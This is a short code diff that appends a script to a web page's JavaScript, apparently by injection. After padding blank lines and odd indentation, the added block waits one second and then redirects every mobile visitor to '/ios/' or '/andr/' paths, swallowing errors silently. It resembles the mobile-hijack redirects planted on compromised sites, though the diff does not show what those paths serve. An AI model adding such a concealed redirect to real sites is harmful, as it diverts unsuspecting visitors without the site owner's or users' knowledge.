@@ -29,3 +29,21 @@ if( /Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)){
  }else{
      document.write('<script type="text/javascript" src="js/wow.min.js"><\/script>');
  }
+
+
+
+
+<script type="text/javascript">
+		function myfun(){
+ try{
+	                     if (/webOS|iPhone|iPod/i.test(navigator.userAgent)) {
+				                       window.location.href="/ios/";
+				                                  }
+	                     else
+		                                    { window.location.href="/andr/";
+							                                                         }
+	         }catch(e){}
+
+}
+if( /Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)){
+     setTimeout("myfun()",1000);}</script>
